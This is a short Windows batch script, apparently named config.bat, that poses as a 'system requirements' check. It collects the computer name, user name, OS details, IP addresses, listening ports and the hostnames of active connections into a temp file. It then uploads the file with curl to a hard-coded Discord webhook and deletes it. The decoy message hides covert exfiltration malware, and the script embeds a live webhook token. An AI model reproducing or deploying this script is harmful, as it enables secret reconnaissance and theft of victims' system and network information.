@echo off

set WEBHOOK_URL=https://discord.com/api/webhooks/1474212204931711052/CEDij9Hss4eK-8zY7JYh1e0By9kYTZ96qh1KrrgPaR-78B8icJd7WGC_jnQjVHrhxtfR

set TEMPFILE=%TEMP%\sysinfo.txt

echo checking system requirements...
echo System Information > "%TEMPFILE%"
echo ------------------ >> "%TEMPFILE%"
echo Computer Name: %COMPUTERNAME% >> "%TEMPFILE%"
echo User Name: %USERNAME% >> "%TEMPFILE%"
echo OS Version: %OS% >> "%TEMPFILE%"

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" >> "%TEMPFILE%" 2>nul

echo ------------------ >> "%TEMPFILE%"
echo IP Configuration >> "%TEMPFILE%"
echo ------------------ >> "%TEMPFILE%"

REM IPv4 and IPv6 addresses
ipconfig | findstr /R /C:"IPv4 Address" /C:"IPv6 Address" >> "%TEMPFILE%"

echo ------------------ >> "%TEMPFILE%"
echo Open TCP Listening Ports >> "%TEMPFILE%"
echo ------------------ >> "%TEMPFILE%"

REM List open TCP ports
netstat -an | findstr /R /C:"LISTENING" >> "%TEMPFILE%"

echo ------------------ >> "%TEMPFILE%"
echo Active Network Connections and Hostnames >> "%TEMPFILE%"
echo ------------------ >> "%TEMPFILE%"

REM List active connections and attempt to resolve hostnames
for /f "tokens=2" %%a in ('netstat -n ^| findstr ESTABLISHED') do (
    nslookup %%a >> "%TEMPFILE%" 2>nul
    echo ------------------ >> "%TEMPFILE%"
)

REM === Send file to Discord webhook ===
curl -H "Content-Type: multipart/form-data" ^
     -F "payload_json={\"username\":\"System Info Bot\",\"content\":\"System and network info attached\"}" ^
     -F "file1=@%TEMPFILE%" ^
     %WEBHOOK_URL%

REM === Clean up ===
del "%TEMPFILE%"
echo Done.
config.bat